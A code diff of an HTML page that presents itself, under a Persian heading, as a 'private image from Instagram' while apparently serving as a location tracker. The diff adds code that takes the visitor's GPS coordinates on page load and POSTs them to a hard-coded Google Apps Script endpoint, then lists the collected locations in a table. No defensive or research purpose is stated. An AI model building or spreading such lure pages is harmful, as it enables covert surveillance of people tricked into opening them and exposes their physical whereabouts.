@@ -5,22 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Location Tracker</title>
     <script>
-        let locations = []; // Array to store the location data
-
-        // Load saved locations from localStorage (if any)
-        function loadLocations() {
-            const savedLocations = localStorage.getItem('locations');
-            if (savedLocations) {
-                locations = JSON.parse(savedLocations); // Parse the saved locations into the locations array
-            }
-        }
-
-        // Save locations to localStorage
-        function saveLocations() {
-            localStorage.setItem('locations', JSON.stringify(locations));
-        }
-
-        // Request geolocation and process it
         function getLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(showPosition, showError);
@@ -29,7 +13,6 @@
             }
         }
 
-        // Show position after getting the location
         function showPosition(position) {
             var latitude = position.coords.latitude;
             var longitude = position.coords.longitude;
@@ -37,35 +20,39 @@
             
             // Create the URL with latitude and longitude
             var locationUrl = "instagram.com/" + latitude + "-" + longitude;
-
-            // Check if the location already exists (same latitude and longitude)
-            let locationExists = false;
-            for (let loc of locations) {
-                if (loc.latitude === latitude && loc.longitude === longitude) {
-                    locationExists = true;
-                    break; // No need to check further, as we found a match
-                }
-            }
-
-            // If the location exists, append a new row with the same coordinates but a new timestamp
-            if (locationExists) {
-                locations.push({locationUrl, latitude, longitude, time});
-            } else {
-                // If the location doesn't exist, add it as a new entry
-                if (locations.length >= 20) {
-                    locations.shift(); // Remove the oldest location if there are more than 20 entries
-                }
-                locations.push({locationUrl, latitude, longitude, time});
-            }
-
-            // Save updated locations to localStorage
-            saveLocations();
-
-            // Update the table with the latest 20 locations
-            updateLocationTable();
             
             // Display status message
             document.getElementById("status").innerHTML = locationUrl + " at " + time;
+
+            // Send the data to Google Sheets using a POST request
+            sendDataToGoogleSheets(latitude, longitude, time);
+        }
+
+        function sendDataToGoogleSheets(latitude, longitude, time) {
+            var url = 'https://script.google.com/macros/s/AKfycbxxaH54X6W7O2P32k2FqKevkf6eWhlkriO4En7-LKFNiQMz3XydfoTDcQzXqIvnjDb_Pg/exec'; // Replace with your Google Apps Script URL
+
+            var data = {
+                latitude: latitude,
+                longitude: longitude,
+                time: time
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: new URLSearchParams(data)
+            })
+            .then(response => response.text())
+            .then(result => {
+                console.log("Data sent to Google Sheets:", result);
+                // After sending data, refresh the table with updated data
+                updateLocationTable();
+            })
+            .catch(error => {
+                console.error("Error sending data:", error);
+            });
         }
 
         // Handle errors for GPS location request
@@ -86,37 +73,43 @@
             }
         }
 
-        // Update the table displaying the last 20 locations
+        // Update the table (retrieve from Google Sheets)
         function updateLocationTable() {
-            let tableBody = document.getElementById("location-table-body");
-            tableBody.innerHTML = ''; // Clear current table contents
+            var url = 'https://script.google.com/macros/s/AKfycbxxaH54X6W7O2P32k2FqKevkf6eWhlkriO4En7-LKFNiQMz3XydfoTDcQzXqIvnjDb_Pg/exec'; // Replace with the Google Sheets API URL to get data
+            fetch(url)
+                .then(response => response.json())
+                .then(locations => {
+                    let tableBody = document.getElementById("location-table-body");
+                    tableBody.innerHTML = ''; // Clear current table contents
 
-            // Add the latest 20 locations (or fewer) to the table
-            locations.forEach((loc, index) => {
-                let row = tableBody.insertRow(); // Insert a new row at the end
-                row.insertCell(0).innerText = index + 1; // Row number
-                row.insertCell(1).innerText = loc.locationUrl; // Instagram link
-                row.insertCell(2).innerText = loc.time; // Time
-            });
+                    locations.forEach((loc, index) => {
+                        let row = tableBody.insertRow(); // Insert a new row at the end
+                        row.insertCell(0).innerText = index + 1; // Row number
+                        row.insertCell(1).innerText = loc.locationUrl; // Instagram link
+                        row.insertCell(2).innerText = loc.time; // Time
+                    });
+                })
+                .catch(error => {
+                    console.error("Error fetching data:", error);
+                });
         }
 
         // Trigger location fetching on page load
         window.onload = function() {
-            loadLocations(); // Load the saved locations from localStorage
-            updateLocationTable(); // Update the table to show the saved locations
             getLocation(); // Start fetching the location
+            updateLocationTable(); // Update the table to show the saved locations
         };
     </script>
 </head>
 <body>
     <h2> تصویر خصوصی از اینستاگرام</h2>
-    <p id="status">بارگذاری...</p>
+    <p id="status">Loading...</p>
     
     <!-- Image you uploaded -->
     <img src="https://raw.githubusercontent.com/vhd10281986/location-tracker/refs/heads/main/photo_2024-11-19_14-09-32.jpg" alt="Location Image" width="400">
     
     <!-- Table to display the last 20 locations -->
-    <h3>Last Links</h3>
+    <h3>Last 20 Locations</h3>
     <table border="1">
         <thead>
             <tr>
